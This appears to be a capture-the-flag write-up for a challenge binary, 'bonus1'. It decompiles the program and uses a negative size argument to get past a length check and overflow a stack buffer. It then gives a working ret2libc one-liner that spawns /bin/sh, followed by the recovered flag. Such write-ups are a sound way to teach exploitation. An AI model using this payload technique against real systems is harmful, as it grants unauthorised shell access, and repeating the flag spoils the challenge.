# bonus1

# Testing the program

When testing without any arguments we get a segfault, we don’t when giving one.

# De-compiling the program

```c
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

// ------------------------ Functions -------------------------

// Address range: 0x8048424 - 0x80484a5
int main(int argc, char ** argv) {
    int32_t str_as_i = atoi((char *)*(int32_t *)(argc + 4)); // 0x8048438
    int32_t result = 1; // 0x8048446
    if (str_as_i < 10) {
        // 0x804844f
        int32_t v1; // bp-60, 0x8048424
        memcpy(&v1, (int32_t *)*(int32_t *)(argc + 8), 4 * str_as_i);
        result = 0;
    }
    // 0x80484a3
    return result;
}

// --------------------- Meta-Information ---------------------

// Detected compiler/packer: gcc (4.6.3)
// Detected functions: 1

```

## Dumping main

```c
(gdb)$ pdisas main
Dump of assembler code for function main:
   0x08048424 <+0>:		push   ebp
   0x08048425 <+1>:		mov    ebp,esp
   0x08048427 <+3>:		and    esp,0xfffffff0
   0x0804842a <+6>:		sub    esp,0x40
   0x0804842d <+9>:		mov    eax,DWORD PTR [ebp+0xc]
   0x08048430 <+12>:	add    eax,0x4
   0x08048433 <+15>:	mov    eax,DWORD PTR [eax]
   0x08048435 <+17>:	mov    DWORD PTR [esp],eax
   0x08048438 <+20>:	call   0x8048360 <atoi@plt>
   0x0804843d <+25>:	mov    DWORD PTR [esp+0x3c],eax
   0x08048441 <+29>:	cmp    DWORD PTR [esp+0x3c],0x9
   0x08048446 <+34>:	jle    0x804844f <main+43>
   0x08048448 <+36>:	mov    eax,0x1
   0x0804844d <+41>:	jmp    0x80484a3 <main+127>
   0x0804844f <+43>:	mov    eax,DWORD PTR [esp+0x3c]
   0x08048453 <+47>:	lea    ecx,[eax*4+0x0]
   0x0804845a <+54>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804845d <+57>:	add    eax,0x8
   0x08048460 <+60>:	mov    eax,DWORD PTR [eax]
   0x08048462 <+62>:	mov    edx,eax
   0x08048464 <+64>:	lea    eax,[esp+0x14]
   0x08048468 <+68>:	mov    DWORD PTR [esp+0x8],ecx
   0x0804846c <+72>:	mov    DWORD PTR [esp+0x4],edx
   0x08048470 <+76>:	mov    DWORD PTR [esp],eax
   0x08048473 <+79>:	call   0x8048320 <memcpy@plt>
   0x08048478 <+84>:	cmp    DWORD PTR [esp+0x3c],0x574f4c46
   0x08048480 <+92>:	jne    0x804849e <main+122>
   0x08048482 <+94>:	mov    DWORD PTR [esp+0x8],0x0
   0x0804848a <+102>:	mov    DWORD PTR [esp+0x4],0x8048580
   0x08048492 <+110>:	mov    DWORD PTR [esp],0x8048583
   0x08048499 <+117>:	call   0x8048350 <execl@plt>
   0x0804849e <+122>:	mov    eax,0x0
   0x080484a3 <+127>:	leave
   0x080484a4 <+128>:	ret
End of assembler dump.
```

- The destination buffer v1 is only 4 bytes (32 bits), but the memcpy() copies `4 * str_as_i` bytes
- While there's a check for `str_as_i < 10`, this still allows copying up to 36 bytes (9 * 4 = 36) into a 4-byte buffer
- The source pointer is derived from argc+8, which likely points to argv[2]

Classic buffer overflow…

There is a system call calling a shell, well have to exploit that.

The UINT_MAX is 4294967295, / 4 is 1073741823, so we can try with -1073741823. / 4 because the input is multiplied by 4.

```c

(gdb) r -1073741803 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
Starting program: /home/user/bonus1/bonus1 -1073741803 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz

Program received signal SIGSEGV, Segmentation fault.
0x4f4f4f4f in ?? ()

(gdb) i r
eax            0x0	0
ecx            0x55555555	1431655765
edx            0xbffff588	-1073744504
ebx            0xb7fd0ff4	-1208152076
esp            0xbffff570	0xbffff570
ebp            0x4e4e4e4e	0x4e4e4e4e
esi            0x0	0
edi            0x0	0
eip            0x4f4f4f4f	0x4f4f4f4f
eflags         0x210287	[ CF PF SF IF RF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
```

Using a pattern string we can see that eip is overwritten and starts at ‘OOOO’ so 56.

```
0x08048482 <+94>:	movl   $0x0,0x8(%esp)
0x0804848a <+102>:	movl   $0x8048580,0x4(%esp)
0x08048492 <+110>:	movl   $0x8048583,(%esp)
0x08048499 <+117>:	call   0x8048350 <execl@plt>

(gdb) x/s 0x8048583
0x8048583:	 "/bin/sh"
```

We also know that the address of "/bin/sh" is "0x8048583”

```
(gdb) info function system
All functions matching regular expression "system":

Non-debugging symbols:
0xb7e6b060  __libc_system
0xb7e6b060  system
0xb7f49550  svcerr_systemerr
```

And that the address of system is 0xb7e6b060  

So to build the string we have to :
`(X * 56) + "set EIP to system address" + "RET = JUNK" + "address of /bin/sh"`

```c
./bonus1 -1073741803 $(python -c 'print "B"*56+"\x60\xb0\xe6\xb7"+"JUNK"+"\x83\x85\x04\x08"')
```

and we get 

579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245